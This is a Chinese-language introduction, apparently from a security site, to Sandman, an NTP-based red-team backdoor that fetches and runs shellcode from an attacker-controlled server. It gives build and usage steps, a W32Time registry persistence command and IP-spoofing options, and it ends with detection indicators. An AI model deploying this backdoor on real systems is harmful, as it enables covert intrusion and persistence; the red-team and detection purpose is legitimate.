![](https://image.3001.net/images/20221101/1667317961_636140c9673a035638548.jpg!small)  

## 关于Sandman

Sandman是一款基于NTP的强大后门工具，该工具可以帮助广大研究人员在一个安全增强型网络系统中执行红队任务。

Sandman可以充当Stager使用，该工具利用了NTP（一个用于计算机时间/日期同步协议）从预定义的服务器获取并运行任意Shell代码。

由于NTP这个协议是很多安全防御人员往往会忽略的一个协议，因此很多网络系统中并不会针对NTP进行检测。

## 功能介绍

> 1、允许从研究人员控制的服务器获取并执行任意Payload；
>
> 2、由于网络防火墙系统中通常会允许使用NTP协议，因此可以将其用于安全增强型网络系统中；
>
> 3、支持通过IP欺骗技术来模拟合法的NTP服务器；

## 工具安装

首先，我们需要使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/Idov31/Sandman.git

### SandmanServer

我们需要在服务器端安装并配置好Python 3.9环境，然后使用项目提供的[ _requirements_
_.txt_](https://github.com/Idov31/Sandman/blob/master/SandmanServer/requirements.txt)文件和pip3命令配置Sandman服务器所需的依赖组件：

    
    
    cd Sandman
    
    pip3 install requirements.txt

### SandmanBackdoor

将项目导入到Visual Studio中，然后使用USE_SHELLCODE完成代码编译即可。

### SandmanBackdoorTimeProvider

首先，安装好[ _DllExport_](https://github.com/3F/DllExport)，然后将项目导入到Visual
Studio中，并使用USE_SHELLCODE完成代码编译即可。

## 工具使用

### SandmanServer使用

在Windows或类Unix设备上运行下列命令即可：

    
    
    python3 sandman_server.py "Network Adapter" "Payload Url" "optional: ip to spoof"

其中，Network Adapter是需要让服务器监听的网络适配器，例如Ethernet、eth0等；Payload
Url即为托管Shellcode的URL地址，例如CobaltStrike、Meterpreter或其他Stager；对于IP to
Spoof，如果你想要执行IP地址欺骗（模拟），可以使用该选项；

### SandmanBackdoor使用

首先，我们需要完成SandmanBackdoor的编译。其次，由于它是一个轻量级的独立C2可执行文件，因此我们可以通过ExecuteAssembly来直接运行它。

### SandmanBackdoorTimeProvider使用

如需使用SandmanBackdoorTimeProvider，可以按照下列步骤操作：

首先，添加下列注册表项：

    
    
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" /v DllName /t REG_SZ /d "C:\Path\To\TheDll.dll"

接下来，重启w32time服务：

    
    
    sc stop w32time
    
    sc start w32time

注意事项：确保使用的是x64选项编译工具源码。

## 工具运行截图

![](https://image.3001.net/images/20221101/1667318025_63614109b2aed7f3e82aa.png!small)

## 入侵威胁指标IoC

> 1、工具会将一个Shellcode注入到RuntimeBroker中；
>
> 2、NTP通信会使用可疑的Header；
>
> 3、可以使用YARA规则检测；

## 许可证协议

本项目的开发与发布遵循[ _BSD_
_-2-Clause_](https://github.com/Idov31/Sandman/blob/master/LICENSE)许可证协议。

## 项目地址

 **Sandman** ：【[ _GitHubc传送门_](https://github.com/Idov31/Sandman)】

## 参考资料

> [ _https://github.com/ORCx41/_](https://github.com/ORCx41/)
>
> [ _https://twitter.com/NotMedic_](https://twitter.com/NotMedic)
>
> [
> _https://twitter.com/NotMedic/status/1561354598744473601_](https://twitter.com/NotMedic/status/1561354598744473601)
>
> [ _https://github.com/3F/DllExport_](https://github.com/3F/DllExport)

